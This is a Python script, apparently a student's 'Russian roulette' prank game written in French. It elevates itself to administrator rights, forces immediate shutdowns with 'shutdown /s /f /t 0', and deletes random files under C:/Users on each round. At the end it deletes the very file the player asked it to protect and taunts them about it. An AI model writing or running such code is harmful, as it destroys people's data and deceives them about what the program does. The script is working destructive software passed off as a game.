import os 
import random
import glob
from colorama import *
import time
from elevate import*



elevate(show_console=True)
g = Fore.GREEN
y = Fore.YELLOW
v = Fore.MAGENTA
w = Fore.WHITE
r = Fore.RED
b = Fore.BLUE

victoir = 0
fichiers_supr = []
fichier = "C:/Users"
fichiers = [""]
filename = "C:\\Users\\a-rabaud\\Desktop\\python\\Pc-lycer-program\\Pc-lycer-program\\kaboummm!!!\\erreur.txt"


    

def Titre():    
    os.system("cls")
    


    print(v + """
    █▀▀█ █▀▀█ █░░█ █░░ █░░ █▀▀ ▀▀█▀▀ ▀▀█▀▀ █▀▀       █▀▀█ █░░█ █▀▀ █▀▀ █▀▀
    █▄▄▀ █░░█ █░░█ █░░ █░░ █▀▀ ░░█░░ ░░█░░ █▀▀       █▄▄▀ █░░█ ▀▀█ ▀▀█ █▀▀
    ▀░▀▀ ▀▀▀▀ ░▀▀▀ ▀▀▀ ▀▀▀ ▀▀▀ ░░▀░░ ░░▀░░ ▀▀▀       ▀░▀▀ ░▀▀▀ ▀▀▀ ▀▀▀ ▀▀▀ 

                                            
    \n\n""")


Titre()
choix = input(r + " Veux tu jouer ? O = OUI N = NON : ").lower()

if choix == "o":
    Fichier_precieux = input(g +"choisi un fichier que tu veux garder absolument pour eviter qu'il soit detruit (mets le chemin d'acces) → ")
    if Fichier_precieux == (""):
        os.system("shutdown /s /f /t 0")

else:
    print(y +  "Bas pourqoi t'as lancer le programme alors ? \n\n")
    time.sleep(2)
    print("sa fonctione")
    os.system("shutdown /s /f /t 0")
    os._exit(1)


while choix == "o":
    Titre()
    aleatoire= random.randint(1,2)

    
    for filename in glob.iglob(f'{fichier}/**/*.*', recursive=False):
        if not filename.endswith('.py'):
            fichiers.append(filename)

    
    while True:
        caca = random.choice(fichiers)
        try:
            os.remove(caca)
        except:
            pass
        else:
            if aleatoire == 1:
                print(g + f"Le fichier {caca}, A correctement été suprimer mon oeuf chou a la creme. \n")
                fichiers_supr.append(caca)
            else:
                victoir += 1
                print(y + "Petit chanceux va ! \n\n")
            break
        
    
    choix = input(r + "Veux tu rejouer ? O = OUI N = NON : \n\n ").lower()

Titre()
print( r + " merci d'avoir jouer vous n'avez abbsolument rien gagner mais vous avez perdu les fichier suivant : \n")
print( g + f"{fichiers_supr} \n")
print( y + f"Vous avez gagner {victoir} fois \n\n\n\n\n" + w )

Troll =  input("Appuyez sur une touche pour continuer...")

if Troll != "£":
    Titre()
    os.remove(Fichier_precieux)
    print(r + f"J'aillait oublier j'ai suprimer le fichier {Fichier_precieux} allez bisou\n")
    time.stop

    



    







